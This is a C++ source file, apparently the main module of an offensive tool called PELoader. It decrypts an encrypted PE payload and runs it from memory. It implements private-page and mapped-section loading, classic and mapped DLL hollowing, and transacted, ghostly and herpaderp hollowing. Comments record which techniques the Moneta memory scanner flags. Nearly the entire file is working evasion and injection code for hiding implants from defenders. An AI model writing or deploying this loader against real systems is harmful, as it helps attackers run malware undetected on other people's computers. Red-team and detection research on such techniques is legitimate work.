#include <Windows.h>
#include <iostream>

#include <peconv.h>

#include <cstdint>
#include "ntddk.h"
#include "map_dll_image.h"
#include "util.h"
#include "aes.h"

#include "transacted_file.h"
#include "delete_pending_file.h"

#pragma warning(disable:4996)

enum phantom { ghost, txf, herpaderp } phantomType;

int prepare_payload(LPCSTR payload_path, OUT BYTE*& raw_payload, OUT BYTE*& payload, OUT size_t& raw_size, OUT size_t& payload_size) {

	raw_payload = decryptFile(payload_path, raw_size);

	// Prepare the payload to be implanted:
	// Convert payload from Raw to Virtual Format

	payload = peconv::load_pe_module(raw_payload, raw_size, payload_size, false, false);
	if (!payload) {
		std::cerr << "[-] Failed to convert the implant to virtual format!\n";
		return 0;
	}

	// Resolve the payload's Import Table
	if (!peconv::load_imports(payload)) {
		std::cerr << "[-] Loading imports failed!\n";
		peconv::free_pe_buffer(payload);
		return 0;
	}

	if (!is_compatibile(raw_payload)) {
		return -1;
	}

	return 1;
}

bool set_sections_access(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	DWORD oldProtect = 0;
	// protect PE header
	if (!VirtualProtect((LPVOID)mapped, PAGE_SIZE, PAGE_READONLY, &oldProtect)) return false;
	
	
	bool is_ok = true;
	
	//RX was set here
	//protect sections
	size_t count = peconv::get_sections_count(implant_dll, implant_size);
	for (size_t i = 0; i < count; i++) {
		IMAGE_SECTION_HEADER* next_sec = peconv::get_section_hdr(implant_dll, implant_size, i);
		if (!next_sec) break;
		DWORD sec_protect = translate_protect(next_sec->Characteristics);
		DWORD sec_offset = next_sec->VirtualAddress;
		DWORD sec_size = next_sec->Misc.VirtualSize;
		if (!VirtualProtect((LPVOID)((ULONG_PTR)mapped + sec_offset), sec_size, sec_protect, &oldProtect)) is_ok = false;
	}
	
	return is_ok;
}

bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	
	std::cout << "[*] Overwriting the mapping\n";
	HANDLE hProcess = GetCurrentProcess();
	bool is_ok = false;
	DWORD oldProtect = 0;

	//cleanup previous module:
	size_t prev_size = peconv::get_image_size((BYTE*)mapped);
	
	if (prev_size) {
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READWRITE, &oldProtect)) return false;
		memset(mapped, 0, prev_size);
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READONLY, &oldProtect)) return false;
	}
	
	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &oldProtect)) {
		std::cout << "implant size: " << implant_size << "\n";
		std::cout << "prev size: " << prev_size << "\n";
		if (implant_size > prev_size) {
			std::cout << "[-] The implant is too big for the target!\n";
		}
		return false;
	}
	
	memcpy(mapped, implant_dll, implant_size);
	is_ok = true;

	// set access:
	if (!set_sections_access(mapped, implant_dll, implant_size)) {
		is_ok = false;
	}
	return is_ok;
}

int run_implant(PVOID mapped, BYTE* buffer)
{
	// Fetch the target's Entry Point
	DWORD ep_rva = peconv::get_entry_point_rva(buffer);
	bool is_dll = peconv::is_module_dll(buffer);
	peconv::free_file(buffer); buffer = nullptr;

	ULONG_PTR implant_ep = (ULONG_PTR)mapped + ep_rva;

	std::cout << "[*] Executing Implant's Entry Point: " << std::hex << implant_ep << "\n";
	if (is_dll) {
		std::cout << "[*] Executing Implant as DLL" << "\n";
		//run the implant as a DLL:
		BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))(implant_ep);
		return dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
	}
	
	std::cout << "[*] Executing Implant as EXE" << "\n";
	//run the implant as EXE:
	BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
	return exe_main();

}

PVOID undo_overloading(LPVOID mapped, char* target_dll)
{
	size_t payload_size = 0;
	BYTE* payload = peconv::load_pe_module(target_dll, payload_size, false, false);
	
	if (!payload) {
		return NULL;
	}
	// Resolve the payload's Import Table
	if (!peconv::load_imports(payload)) {
		peconv::free_pe_buffer(payload);
		return NULL;
	}
	// Relocate the payload into the target base:
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)) {
		return NULL;
	}
	if (!overwrite_mapping(mapped, payload, payload_size)) {
		return NULL;
	}
	// Free the buffer that was used for the payload's preparation
	peconv::free_pe_buffer(payload);
	return mapped;
}

BOOL search_hollow_dll(wchar_t* FilePath, size_t size_FilePath, size_t size_of_shellcode)
{
	if (size_FilePath < MAX_PATH * 2)
	{
		return FALSE;
	}

	wchar_t				SearchFilePath[MAX_PATH * 2];
	HANDLE				hFind = NULL;
	BOOL				found = FALSE;
	WIN32_FIND_DATAW	Wfd;
	size_t				size_dest = 0;

	if (GetSystemDirectoryW(SearchFilePath, MAX_PATH * 2) == 0) {
		printf("GetSystemDirectoryW: %d\n", GetLastError());
		return FALSE;
	}

	//search dll to load/map
	wcscat_s(SearchFilePath, MAX_PATH * 2, L"\\*.dll");
	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
		do {
			if (GetModuleHandleW(Wfd.cFileName) == NULL) {

				if (GetSystemDirectoryW(FilePath, MAX_PATH * 2) == 0) {
					printf("GetSystemDirectoryW: %d\n", GetLastError());
					return FALSE;
				}

				// Write File Path
				wcscat_s(FilePath, MAX_PATH * 2, L"\\");
				wcscat_s(FilePath, MAX_PATH * 2, Wfd.cFileName);

				//wprintf(L"Checking %ls\n", FilePath);

				size_dest = getSizeOfImage(FilePath);

				//wprintf(L"DLL is 0x%x bytes\n", size_dest);

				if (size_of_shellcode < size_dest) {
					found = TRUE;
				}
			}
		} while (!found && FindNextFileW(hFind, &Wfd));
		// close the handle 
		FindClose(hFind);
	}
	return found;
}

int private_loader(LPCSTR payload_path) {

	BYTE* raw_payload;
	BYTE* payload;
	size_t raw_size;
	size_t payload_size;
	if (!prepare_payload(payload_path, raw_payload, payload, raw_size, payload_size))
		return -1;

	LPVOID allocation_start = nullptr;
	NTSTATUS status = NtAllocateVirtualMemory(
		NtCurrentProcess(),
		&allocation_start, 0, 
		(PULONG)&payload_size,
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE
	);
	std::cout << "[*] Allocated a RW memory region\n";


	// Relocate the payload into the target base:
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)allocation_start)) {
		std::cerr << "[-] Failed to relocate the implant!\n";
		return NULL;
	}


	// Implant the payload:
	// Moneta: mapped page | RX | Abnormal mapped executable memory
	// Fill the local mapped section (RW) with the payload
	if (!overwrite_mapping(allocation_start, payload, payload_size)) {
		return NULL;
	}
	//protection changed to RX
	std::cout << "[*] Set page to RX\n";

	// Free the buffer that was used for the payload's preparation
	peconv::free_pe_buffer(payload);

	// Run the payload:
	int ret = run_implant(allocation_start, raw_payload);

}

int mapped_loader(LPCSTR payload_path)
{
	BYTE* raw_payload;
	BYTE* payload;
	size_t raw_size;
	size_t payload_size;
	if (!prepare_payload(payload_path, raw_payload, payload, raw_size, payload_size))
		return -1;

	
	HANDLE hSection = nullptr;
	SIZE_T size = payload_size;
	LARGE_INTEGER sectionSize = { payload_size };
	NTSTATUS status = NtCreateSection(
		&hSection,
		SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, 
		NULL, 
		(PLARGE_INTEGER)&sectionSize, 
		PAGE_EXECUTE_READWRITE, 
		SEC_COMMIT, 
		NULL
	);
	
	//Moneta: mapped page | RWX | Abnormal mapped executable memory
	PVOID mapSectionAddress = NULL;
	NtMapViewOfSection(
		hSection, 
		NtCurrentProcess(), 
		&mapSectionAddress, 
		NULL, NULL, NULL, 
		&size, 
		ViewUnmap,
		NULL, 
		PAGE_EXECUTE_READWRITE
	);
	std::cout << "Created RWX mapped section\n";
	
	

	//Moneta: no detection
	//if map section with RW, failed to change protection to RX.
	DWORD oldProtect = 0;
	VirtualProtect(mapSectionAddress, payload_size, PAGE_READWRITE, &oldProtect);
	std::cout << "[*] Set page to RW\n";

	// Relocate the payload into the target base:
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapSectionAddress)) {
		std::cerr << "[-] Failed to relocate the implant!\n";
		return NULL;
	}
	


	// Implant the payload:
	// Moneta: mapped page | RX | Abnormal mapped executable memory
	// Fill the local mapped section (RW) with the payload
	if (!overwrite_mapping(mapSectionAddress, payload, payload_size)) {
		return NULL;
	}
	//protection changed to RX
	

	// Free the buffer that was used for the payload's preparation
	peconv::free_pe_buffer(payload);
	
	
	// Run the payload:
	int ret = run_implant(mapSectionAddress, raw_payload);

	return 0;
}

int dll_hollower(const char* payload_path, bool isClassic, char target_dll[MAX_PATH * 2] = NULL) {
	
	BYTE* raw_payload;
	BYTE* payload;
	size_t raw_size;
	size_t payload_size;
	if(!prepare_payload(payload_path, raw_payload, payload, raw_size, payload_size))
		return -1;

	
	if (target_dll == NULL) {
		wchar_t sacrificial_dll_path[MAX_PATH * 2];
		char t[MAX_PATH * 2] = { 0 };
		if (!search_hollow_dll(sacrificial_dll_path, MAX_PATH * 2, raw_size)) {
			std::cout << "failed to search a sacrificial dll";
			return 0;
		}
		wcstombs(t, sacrificial_dll_path, MAX_PATH * 2);
		target_dll = t;
	}
	std::cout << "[*] target dll: " << target_dll << "\n";
	std::cout << "[*] implant dll: " << payload_path << "\n";


	// Prepare the target:
	// Load the DLL that is going to be replaced:
	PVOID mapped;
	if (isClassic) {
		std::cout << "[*] Loading the DLL (using LoadLibary, classic DLL hollowing)...\n";
		mapped = LoadLibraryA(target_dll);
	}
	else {
		std::cout << "[*] Mapping the DLL image...\n";
		mapped = map_dll_image(target_dll);
	}

	if (!mapped) {
		return NULL;
	}

	// Relocate the payload into the target base:
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)) {
		std::cerr << "[-] Failed to relocate the implant!\n";
		return NULL;
	}

	// Implant the payload:
	// Overwrite the target DLL with the payload
	if (!overwrite_mapping(mapped, payload, payload_size)) {
		undo_overloading(mapped, target_dll);
		return NULL;
	}

	// Free the buffer that was used for the payload's preparation
	peconv::free_pe_buffer(payload);
	
	if (!mapped) {
		std::cerr << "[ERROR] Module Overloading failed!\n";
		return -1;
	}

	std::cout << "[*] Module Overloading finished...\n";


	// Run the payload:
	int ret = run_implant(mapped, raw_payload);
	std::cout << "[*] Implant finished, ret: " << std::dec << ret << "\n";
	if (isClassic) {
		// In case if the target was loaded via LoadLibrary, the same DllMain must be called on unload
		// and if it was not found the app will crash.
		// So we need to rollback the replacement before the app terminates...
		undo_overloading(mapped, target_dll);
	}

	return 0;
}

int phantom_hollower(LPCSTR payload_path, phantom phantomType, const char temp_pathc[MAX_PATH] = NULL) {

	BYTE* raw_payload;
	BYTE* payload;
	size_t raw_size;
	size_t payload_size;
	if (!prepare_payload(payload_path, raw_payload, payload, raw_size, payload_size))
		return -1;


	wchar_t dummy_name[MAX_PATH];
	wchar_t temp_path[MAX_PATH] = { 0 };
	if (temp_pathc == NULL) {
		DWORD size = GetTempPathW(MAX_PATH, temp_path);
	}
	else 
		mbstowcs(temp_path, temp_pathc, MAX_PATH);
	GetTempFileNameW(temp_path, L"Log", 0, dummy_name);
	std::cout << "[*] Created dummy file: ";
	std::wcout << dummy_name << std::endl;

	HANDLE hSection = NULL;
	
	if (phantomType == (phantom)ghost) {
		hSection = make_section_from_delete_pending_file(dummy_name, payload, payload_size);
	}
	else if (phantomType == (phantom)txf) {
		hSection = make_transacted_section(dummy_name, payload, payload_size);
	}
	else {
		hSection = make_section_from_overwrite_file(dummy_name, payload, payload_size);
	}

	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
		std::cout << "Creating detected section has failed!\n";
		return false;
	}

	//map buffer into section
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T viewSize = 0;
	PVOID sectionBaseAddress = 0;

	
	//Moneta64: Phantom Image        | Missing PEB module | Phantom image
	if ((status = NtMapViewOfSection(hSection, 
		NtCurrentProcess(), 
		&sectionBaseAddress, 
		NULL, NULL, NULL, 
		&viewSize, 
		ViewShare, 
		NULL, 
		PAGE_READONLY)) != STATUS_SUCCESS)
	{
		if (status == STATUS_IMAGE_NOT_AT_BASE) {
			std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
		}
		else {
			std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
			return NULL;
		}
	}
	std::cout << "[*] Mapped Base: " << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
	
	//make a seperated function for this and mapped_loader
	// Relocate the payload into the target base:
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)sectionBaseAddress)) {
		std::cerr << "[-] Failed to relocate the implant!\n";
		return NULL;
	}

	// Implant the payload:
	// Fill the local mapped section (RW) with the payload
	if (!overwrite_mapping(sectionBaseAddress, payload, payload_size)) {
		return NULL;
	}
	//protection changed to RX

	// Free the buffer that was used for the payload's preparation
	peconv::free_pe_buffer(payload);

	// Run the payload:
	int ret = run_implant(sectionBaseAddress, raw_payload);

	return 0;
}

void printHelp() {
	std::cout <<
		"PELoader\n"
		"More info: https://github.com/Hagrid29/PELoader/\n";
	std::cout <<
		"set hagrid=<PELoader argument>\n"
		".\\PELoader.exe [binaray argument]\n"
		"Options:\n"
		"Encryption: enc <payload> [output file]\n"
			"\t<payload> - the payload that will be encrypted\n"
		"Private Page: priv <encrypted payload>\n"
			"\t<encrypted payload> - the shellcode that will be implanted\n"
		"Mapped Page: map <encrypted payload>\n"
			"\t<encrypted payload> - the shellcode that will be implanted\n"
		"DLL Hollowing (Load): cdll <encrypted payload> [target dll]\n"
			"\t<encrypted payload> - the shellcode that will be implanted\n"
			"\t[target dll] - the DLL that will be loaded by LoadLibary (default: auto search a sutiable DLL)\n"
		"DLL Hollowing (Map): mdll <encrypted payload> [target dll]\n"
			"\t<encrypted payload> - the shellcode that will be implanted\n"
			"\t[target dll] - the DLL that will be mapped (default: auto search a sutiable DLL)\n"
		"Transacted Hollowing: txf <encrypted payload> [dummy file | file path]\n"
			"\t<encrypted payload> - the shellcode that will be implanted\n"
			"\t[dummy file] - the dummy file (not necessarily exist) that will be transacted (default: create random file)\n"
		"Ghostly Hollowing: ghost <encrypted payload> [dummy file]\n"
			"\t<encrypted payload> - the shellcode that will be implanted\n"
			"\t[dummy file] - the dummy file (necessarily exist) that will be put in delete-pending state (default: create random file)\n"
		"Herpaderply Hollowing: herpaderp <encrypted payload> [dummy file]\n"
			"\t<encrypted payload> - the shellcode that will be implanted\n"
			"\t[dummy file] - the dummy file (necessarily exist) that will be overwritten (default: create random file)\n"
		<< std::endl;
	return;
}

int main(int argc, char* argv[], char* envp[])
{

	char* hagrid[3];
	int h = 0;
	char* token;
	const char s[2] = " ";
	if (char* env_p = std::getenv("hagrid")) {
		std::cout << "argument: " << env_p << std::endl;
		token = strtok(env_p, s);
		while (token != NULL)
		{
			hagrid[h] = (char*)malloc(strlen(token) + 1);
			strcpy(hagrid[h], token);
			h++;
			token = strtok(NULL, s);
		}
	
	}

	if (h < 2) {
		printHelp();
		return 0;
	}
	bool isClassic = FALSE;
	if (strcmp(hagrid[0], "cdll") == 0) {
		std::cout << "Classic ";
		isClassic = TRUE;
	}
	if (strcmp(hagrid[0], "mdll") == 0 || strcmp(hagrid[0], "cdll") == 0) {
		std::cout << "DLL Hollowing\n";
		char target_dll[MAX_PATH * 2] = { 0 };

		if (h < 3) {
			dll_hollower(hagrid[1], isClassic);
		}
		else {
			ExpandEnvironmentStringsA(hagrid[2], target_dll, MAX_PATH * 2);
			dll_hollower(hagrid[1], isClassic, target_dll);
		}

	}else if (strcmp(hagrid[0], "enc") == 0) {
		printf("Encrypting File\n");
		if (h == 2)
			encryptFile(hagrid[1], nullptr);
		else if (h == 3)
			encryptFile(hagrid[1], hagrid[2]);
		else
			printHelp();
	}else if (strcmp(hagrid[0], "map") == 0) {
		std::cout << "Mapped Section\n";
		mapped_loader(hagrid[1]);
	}
	else if (strcmp(hagrid[0], "priv") == 0) {
		std::cout << "Private Page\n";
		private_loader(hagrid[1]);
	}
	else if (strcmp(hagrid[0], "ghost") == 0) {
		std::cout << "Ghostly Hollowing\n";
		phantomType = (phantom)ghost;

		if (h < 3) 
			phantom_hollower(hagrid[1], phantomType);
		else 
			phantom_hollower(hagrid[1], phantomType, hagrid[2]);
		
	}
	else if (strcmp(hagrid[0], "txf") == 0) {
		std::cout << "Transacted Hollowing\n";
		phantomType = (phantom)txf;

		if (h < 3)
			phantom_hollower(hagrid[1], phantomType);
		else
			phantom_hollower(hagrid[1], phantomType, hagrid[2]);
	}
	else if (strcmp(hagrid[0], "herpaderp") == 0) {
		std::cout << "Herpaderply Hollowing\n";
		phantomType = (phantom)herpaderp;

		if (h < 3)
			phantom_hollower(hagrid[1], phantomType);
		else
			phantom_hollower(hagrid[1], phantomType, hagrid[2]);
	}
	else {
		printHelp();
	}


	return 0;
}
